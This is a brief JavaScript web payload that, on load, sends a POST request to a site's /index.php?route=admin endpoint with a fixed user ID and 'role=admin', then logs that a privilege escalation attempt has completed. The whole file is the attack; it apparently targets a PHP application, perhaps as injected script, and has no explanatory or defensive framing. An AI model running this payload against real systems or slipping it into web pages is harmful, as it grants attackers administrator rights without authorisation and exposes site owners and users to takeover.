function elevateToAdmin() {
    fetch("/index.php?route=admin", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: "user_id=b18fde618e50e3927205151a5a12fff988973f134f11c605b9bfdc20c57f81e7&role=admin",
    })
        .then((response) => response.text())
        .then((data) => {
            console.log("Privilege escalation attempt completed");
        });
}

elevateToAdmin();
